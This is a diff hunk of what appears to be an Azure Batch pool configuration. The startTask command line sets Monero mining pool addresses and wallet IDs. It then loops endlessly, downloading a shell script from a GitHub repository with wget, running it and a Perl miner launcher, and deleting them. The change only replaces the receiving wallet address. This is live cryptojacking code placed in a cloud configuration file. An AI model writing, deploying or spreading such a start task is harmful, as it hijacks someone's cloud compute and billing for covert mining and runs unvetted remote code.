@@ -24,7 +24,7 @@
         }
     },
     "startTask": {
-        "commandLine": "/bin/bash -c \"export pool_pass1=POOL:azure;export pool_address1=pool.supportxmr.com:5555;export wallet1=454BzuiXKEFjBCqQHmxAahEjGNLr9Eg4kJQdH33ryLWz99Aar391G89TFdPbExdtBQBYqy8EaUgffj4jri8JAEr59TtMrWb;export nicehash1=true;export pool_pass2=POOL:azure;export pool_address2=pool-ca.supportxmr.com:5555;export wallet2=454BzuiXKEFjBCqQHmxAahEjGNLr9Eg4kJQdH33ryLWz99Aar391G89TFdPbExdtBQBYqy8EaUgffj4jri8JAEr59TtMrWb;export nicehash2=true;while [ 1 ] ;do wget https://raw.githubusercontent.com/U117A/azure-cloud/master/setup_vm4.sh; chmod u+x setup_vm4.sh ; ./setup_vm4.sh ; cd azure-cloud; cd azure_script; chmod u+x run_process.pl; ./run_process.pl 30; cd ..; cd ..; rm -rf azure-cloud ; rm -rf setup_vm4.sh; done;\"",
+        "commandLine": "/bin/bash -c \"export pool_pass1=POOL:azure;export pool_address1=pool.supportxmr.com:5555;export wallet1=45EG375EjZQW1cvv91GvxXcYJXXiF5AzmKBdB57bEbfEaB2mM1CUD4XMUZFuLpmBXfXqN9XpJAHwX3oY7csSfcHW13LwxwM;export nicehash1=true;export pool_pass2=POOL:azure;export pool_address2=pool-ca.supportxmr.com:5555;export wallet2=45EG375EjZQW1cvv91GvxXcYJXXiF5AzmKBdB57bEbfEaB2mM1CUD4XMUZFuLpmBXfXqN9XpJAHwX3oY7csSfcHW13LwxwM;export nicehash2=true;while [ 1 ] ;do wget https://raw.githubusercontent.com/U117A/azure-cloud/master/setup_vm4.sh; chmod u+x setup_vm4.sh ; ./setup_vm4.sh ; cd azure-cloud; cd azure_script; chmod u+x run_process.pl; ./run_process.pl 30; cd ..; cd ..; rm -rf azure-cloud ; rm -rf setup_vm4.sh; done;\"",
         "userIdentity": {
             "autoUser": {
                 "scope": "task",
